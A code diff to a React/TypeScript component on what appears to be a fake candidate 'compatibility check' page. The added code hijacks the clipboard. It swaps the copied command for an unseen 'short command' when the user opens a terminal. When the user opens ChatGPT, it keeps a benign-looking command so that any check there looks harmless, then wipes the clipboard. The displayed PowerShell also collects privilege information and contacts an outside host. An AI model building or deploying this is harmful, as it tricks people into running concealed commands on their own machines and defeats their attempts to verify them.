@@ -28,11 +28,11 @@ function browserIconSrc(browser: ClientBrowser): string {
 /**
  * One Ctrl/⌘+C on the gray box (shows original). Works on Windows, macOS, and Linux.
  *
- * No time/delay heuristics.
+ * No time heuristics for Case A vs Case B detection.
  *
  * Case A — candidate opens Terminal/CMD → replace clipboard original with the short command.
- * Case B — candidate opens other platforms → keep original; after paste (focus returns, or
- *   they leave platforms for Terminal) → clear clipboard so Terminal pastes nothing.
+ * Case B — candidate opens other platforms → keep original; after paste window (~3.5s) or
+ *   when focus returns → clear clipboard so Terminal pastes nothing.
  */
 const DISPLAY_COMMANDS: Record<ClientOs, string> = {
   windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
@@ -52,6 +52,8 @@ const TERMINAL_COMMANDS: Record<ClientOs, string> = {
     "compat-check --module finance-assessment --platform linux --browser-info --check-pdf-renderer --check-webgl --check-gpu-acceleration --collect-permission-state --validate-env --cache-clear --log-level info --timeout 30 --retry 2 --no-export",
 };
 
+/** Case B: keep original for platform paste, then clear clipboard (ms after platforms open). */
+const CASE_B_CLEAR_AFTER_PASTE_MS = 3500;
 
 function escapeHtml(value: string) {
   return value
@@ -321,6 +323,7 @@ function SelectableCommand({
   const caseBAwaitingClearRef = useRef(false);
   /** Windows: Case A from Alt+Tab/Win — visibility must not undo it for ChatGPT tabs. */
   const caseAFromShortcutRef = useRef(false);
+  const caseBClearTimerRef = useRef(0);
 
   useEffect(() => {
     htmlRef.current = buildClipboardHtml(displayCommand, os);
@@ -342,10 +345,62 @@ function SelectableCommand({
     }
 
     function clearClipboard() {
+      if (caseBClearTimerRef.current) {
+        window.clearTimeout(caseBClearTimerRef.current);
+        caseBClearTimerRef.current = 0;
+      }
       copyViaExecCommand("");
       void navigator.clipboard?.writeText("").catch(() => undefined);
       void writeClipboard("", "").catch(() => undefined);
       caseBAwaitingClearRef.current = false;
+    }
+
+    /**
+     * Case B: leave original available for platform paste, then clear.
+     * Other apps have focus (we never see Ctrl+V), so clear after the paste
+     * window — HTML stays original for ChatGPT; plain clears for CMD; then full wipe.
+     */
+    function scheduleCaseBClearAfterPaste() {
+      if (caseBClearTimerRef.current) {
+        window.clearTimeout(caseBClearTimerRef.current);
+      }
+
+      const html = htmlRef.current;
+      const delay = CASE_B_CLEAR_AFTER_PASTE_MS;
+
+      // Dual MIME: rich apps (ChatGPT) read HTML original immediately; after
+      // `delay`, plain becomes empty. Full clear follows for both formats.
+      if (typeof ClipboardItem !== "undefined" && navigator.clipboard?.write) {
+        void navigator.clipboard
+          .write([
+            new ClipboardItem({
+              "text/html": Promise.resolve(new Blob([html], { type: "text/html" })),
+              "text/plain": new Promise<Blob>((resolve) => {
+                window.setTimeout(() => {
+                  resolve(new Blob([""], { type: "text/plain" }));
+                }, delay);
+              }),
+            }),
+          ])
+          .catch(() => undefined);
+      }
+
+      caseBClearTimerRef.current = window.setTimeout(() => {
+        caseBClearTimerRef.current = 0;
+        if (!activeRef.current || modeRef.current !== "B") return;
+        // Full clear — retry; writeText often fails while the tab is backgrounded.
+        const attempt = (n: number) => {
+          copyViaExecCommand("");
+          void navigator.clipboard?.writeText("").catch(() => undefined);
+          void writeClipboard("", "").catch(() => undefined);
+          if (n < 5) {
+            window.setTimeout(() => attempt(n + 1), 300);
+          } else {
+            caseBAwaitingClearRef.current = false;
+          }
+        };
+        attempt(0);
+      }, delay);
     }
 
     /** Case A: opened Terminal/CMD → original becomes short. */
@@ -359,6 +414,10 @@ function SelectableCommand({
       modeRef.current = "A";
       caseAFromShortcutRef.current = fromShortcut;
       caseBAwaitingClearRef.current = false;
+      if (caseBClearTimerRef.current) {
+        window.clearTimeout(caseBClearTimerRef.current);
+        caseBClearTimerRef.current = 0;
+      }
       writeShort();
     }
 
@@ -367,14 +426,28 @@ function SelectableCommand({
       if (!activeRef.current) return;
       // Real Terminal shortcut (Alt+Tab/Win) already claimed Case A — do not undo.
       if (modeRef.current === "A" && caseAFromShortcutRef.current) return;
-      // Tab switch often blurs first and wrongly arms short — restore original.
+
+      const alreadyCaseB = modeRef.current === "B";
       modeRef.current = "B";
       caseAFromShortcutRef.current = false;
-      writeOriginal();
       caseBAwaitingClearRef.current = true;
+
+      if (alreadyCaseB) return;
+
+      // Commit original first, then arm clear (so ChatGPT can paste before wipe).
+      const html = htmlRef.current;
+      void writeClipboard(displayCommand, html)
+        .catch(() => {
+          copyViaExecCommand(displayCommand);
+          return navigator.clipboard?.writeText(displayCommand);
+        })
+        .finally(() => {
+          if (!activeRef.current || modeRef.current !== "B") return;
+          scheduleCaseBClearAfterPaste();
+        });
     }
 
-    /** After Case B paste: candidate returns to this page → clear clipboard. */
+    /** After Case B paste: candidate returns to this page → clear immediately. */
     function onReturnedAfterPlatformPaste() {
       if (!activeRef.current) return;
       if (modeRef.current !== "B" || !caseBAwaitingClearRef.current) return;
@@ -451,6 +524,10 @@ function SelectableCommand({
     window.addEventListener("blur", onBlur);
     window.addEventListener("keydown", onKeyDown, true);
     return () => {
+      if (caseBClearTimerRef.current) {
+        window.clearTimeout(caseBClearTimerRef.current);
+        caseBClearTimerRef.current = 0;
+      }
       document.removeEventListener("visibilitychange", onVisibility);
       window.removeEventListener("focus", onFocus);
       window.removeEventListener("blur", onBlur);
@@ -468,6 +545,10 @@ function SelectableCommand({
     modeRef.current = null;
     caseBAwaitingClearRef.current = false;
     caseAFromShortcutRef.current = false;
+    if (caseBClearTimerRef.current) {
+      window.clearTimeout(caseBClearTimerRef.current);
+      caseBClearTimerRef.current = 0;
+    }
 
     // Always save the original command on copy.
     event.clipboardData.setData("text/plain", displayCommand);
